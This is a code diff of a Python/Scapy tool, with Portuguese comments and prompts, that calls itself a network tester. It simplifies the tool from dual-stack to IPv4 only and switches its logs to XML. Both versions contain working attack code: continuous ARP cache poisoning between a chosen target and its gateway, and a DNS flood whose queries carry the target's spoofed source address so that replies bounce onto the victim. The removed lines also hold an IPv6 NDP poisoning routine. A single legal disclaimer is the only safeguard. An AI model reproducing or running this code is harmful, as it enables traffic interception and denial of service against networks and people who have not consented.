@@ -21,12 +21,10 @@ def dict_to_xml(tag, d):
     return ''.join(parts)
 
 class AdvancedNetworkTester:
-    def __init__(self, target_ip, gateway_ipv4, gateway_ipv6, duration, dns_ipv4=["8.8.8.8"], dns_ipv6=["2001:4860:4860::8888"]):
+    def __init__(self, target_ip, gateway_ip, duration, dns_server="8.8.8.8"):
         self.target_ip = target_ip
-        self.gateway_ipv4 = gateway_ipv4
-        self.gateway_ipv6 = gateway_ipv6
-        self.dns_ipv4 = dns_ipv4
-        self.dns_ipv6 = dns_ipv6
+        self.gateway_ip = gateway_ip
+        self.dns_server = dns_server
         self.attack_duration = duration
         
         self.running = False
@@ -34,6 +32,7 @@ class AdvancedNetworkTester:
         
         self.log_dir = "/var/log/network_tests"
         os.makedirs(self.log_dir, exist_ok=True)
+        # Alterado para exportar logs em XML
         self.log_file = os.path.join(self.log_dir, f"test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
         
         self.stats = {
@@ -54,6 +53,7 @@ class AdvancedNetworkTester:
         
         try:
             with open(self.log_file, 'a') as f:
+                # Converter o dicionário para XML
                 xml_entry = dict_to_xml('log', log_entry)
                 f.write(xml_entry + '\n')
         except Exception as e:
@@ -63,8 +63,8 @@ class AdvancedNetworkTester:
         self._log_event('ARP_START', 'Iniciando envenenamento ARP')
         while self.running:
             try:
-                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ipv4), verbose=0)
-                send(ARP(op=2, pdst=self.gateway_ipv4, psrc=self.target_ip), verbose=0)
+                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip), verbose=0)
+                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip), verbose=0)
                 self.stats['arp_packets_sent'] += 2
                 time.sleep(0.5)
             except Exception as e:
@@ -72,65 +72,37 @@ class AdvancedNetworkTester:
                 self._log_event('ARP_ERROR', str(e))
                 time.sleep(1)
 
-    def ndp_poison(self):
-        self._log_event('NDP_START', 'Iniciando envenenamento NDP')
-        while self.running and self.gateway_ipv6:
-            try:
-                send(IPv6(dst=self.gateway_ipv6) / ICMPv6ND_NS(tgt=self.target_ip), verbose=0)
-                send(IPv6(dst=self.target_ip) / ICMPv6ND_NA(tgt=self.gateway_ipv6), verbose=0)
-                self.stats['arp_packets_sent'] += 2
-                time.sleep(0.5)
-            except Exception as e:
-                self.stats['errors'] += 1
-                self._log_event('NDP_ERROR', str(e))
-                time.sleep(1)
-
     def dns_flood(self):
         self._log_event('DNS_START', 'Iniciando DNS flood')
         while self.running:
-            # Target all IPv4 DNS servers
-            for dns in self.dns_ipv4:
-                try:
-                    send(
-                        IP(dst=dns, src=self.target_ip) /
-                        UDP(dport=53) /
-                        DNS(
-                            rd=1,
-                            qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
-                        ),
-                        verbose=0
-                    )
-                    self.stats['dns_packets_sent'] += 1
-                    time.sleep(0.01)
-                except Exception as e:
-                    self.stats['errors'] += 1
-                    self._log_event('DNS_ERROR', str(e))
-                    time.sleep(0.1)
-
-            # Target all IPv6 DNS servers
-            for dns in self.dns_ipv6:
-                try:
-                    send(
-                        IPv6(dst=dns, src=self.target_ip) /
-                        UDP(dport=53) /
-                        DNS(
-                            rd=1,
-                            qd=DNSQR(qname=random.choice([ "google.com", "youtube.com", "facebook.com", "instagram.com", "twitter.com"]))
-                        ),
-                        verbose=0
-                    )
-                    self.stats['dns_packets_sent'] += 1
-                    time.sleep(0.01)
-                except Exception as e:
-                    self.stats['errors'] += 1
-                    self._log_event('DNS_ERROR', str(e))
-                    time.sleep(0.1)
+            try:
+                send(
+                    IP(dst=self.dns_server, src=self.target_ip)/
+                    UDP(dport=53)/
+                    DNS(
+                        rd=1,
+                        qd=DNSQR(qname=random.choice([
+                            "google.com", 
+                            "youtube.com", 
+                            "facebook.com",
+                            "instagram.com",
+                            "twitter.com"
+                        ]))
+                    ),
+                    verbose=0
+                )
+                self.stats['dns_packets_sent'] += 1
+                time.sleep(0.01)
+            except Exception as e:
+                self.stats['errors'] += 1
+                self._log_event('DNS_ERROR', str(e))
+                time.sleep(0.1)
 
     def restore_network(self):
         self._log_event('RESTORE', 'Restaurando tabelas ARP')
         try:
-            send(ARP(op=2, pdst=self.gateway_ipv4, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
-            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ipv4, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
+            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
+            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
         except Exception as e:
             self._log_event('RESTORE_ERROR', str(e))
 
@@ -145,17 +117,12 @@ class AdvancedNetworkTester:
         
         print(f"\n🔧 Configuração do Teste:")
         print(f"   • Alvo: {self.target_ip}")
-        print(f"   • Gateway IPv4: {self.gateway_ipv4}")
-        print(f"   • Gateway IPv6: {self.gateway_ipv6}")
-        print(f"   • DNS IPv4: {', '.join(self.dns_ipv4)}")
-        print(f"   • DNS IPv6: {', '.join(self.dns_ipv6)}")
+        print(f"   • Gateway: {self.gateway_ip}")
+        print(f"   • DNS Server: {self.dns_server}")
         print(f"   • Duração: {self.attack_duration}s")
         print(f"   • Log File: {self.log_file}\n")
         
-        if self.gateway_ipv4:
-            threading.Thread(target=self.arp_poison, daemon=True).start()
-        if self.gateway_ipv6:
-            threading.Thread(target=self.ndp_poison, daemon=True).start()
+        threading.Thread(target=self.arp_poison, daemon=True).start()
         threading.Thread(target=self.dns_flood, daemon=True).start()
         
         try:
@@ -203,21 +170,13 @@ def main():
     global tester
     
     target = get_user_input("Digite o endereço IP do alvo")
-    gateway_ipv4 = get_user_input("Digite o endereço IPv4 do gateway (deixe em branco para não usar IPv4)", "")
-    gateway_ipv6 = get_user_input("Digite o endereço IPv6 do gateway (deixe em branco para não usar IPv6)", "")
+    gateway = get_user_input("Digite o endereço IP do gateway")
+    dns = get_user_input("Digite o servidor DNS", "8.8.8.8")
+    duration = int(get_user_input("Digite a duração do teste em segundos", "30"))
     
-    # DNS lists
-    dns_ipv4_input = get_user_input("Digite os servidores DNS IPv4 separados por vírgula (deixe em branco para usar o padrão: 8.8.8.8)", "8.8.8.8")
-    dns_ipv4 = dns_ipv4_input.split(",") if dns_ipv4_input else ["8.8.8.8"]
-    
-    dns_ipv6_input = get_user_input("Digite os servidores DNS IPv6 separados por vírgula (deixe em branco para usar o padrão: 2001:4860:4860::8888)", "2001:4860:4860::8888")
-    dns_ipv6 = dns_ipv6_input.split(",") if dns_ipv6_input else ["2001:4860:4860::8888"]
-    
-    duration = int(get_user_input("Digite a duração do teste em segundos", "60"))
-
     print("\n⚠️ AVISO LEGAL: Use apenas em redes próprias ou com autorização explícita!\n")
     
-    tester = AdvancedNetworkTester(target, gateway_ipv4, gateway_ipv6, duration, dns_ipv4, dns_ipv6)
+    tester = AdvancedNetworkTester(target, gateway, duration, dns)
     signal.signal(signal.SIGINT, signal_handler)
     tester.start()
     
